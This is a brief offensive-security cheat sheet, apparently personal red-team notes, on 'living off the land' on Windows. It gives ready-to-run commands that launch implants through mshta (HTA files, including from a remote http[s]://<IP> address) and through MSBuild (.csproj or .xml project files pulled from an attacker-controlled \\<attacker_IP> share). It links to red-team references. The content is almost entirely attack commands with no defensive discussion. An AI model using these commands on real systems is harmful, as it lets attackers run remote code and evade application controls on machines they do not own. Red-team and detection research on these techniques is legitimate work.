# Living off the Land

## 01 - MSHTA

```
C:\> mshta %CD%\implant.hta

C:\> mshta <drive_letter>:\absolute\path\to\implant.hta

C:\> mshta http[s]://<IP>/implant.hta
```

## 02 - MSBuild

Execute C# project implants.

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\<attacker_IP>\implant.csproj

C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\<attacker_IP>\implant.xml
```

---
## References

- [[DotNET Execution|Code Execution: MSBuild]]

- [Red Team Notes: Code Execution](https://www.ired.team/offensive-security/code-execution)

- [Sevagas: Hacking around HTA files](https://blog.sevagas.com/?Hacking-around-HTA-files)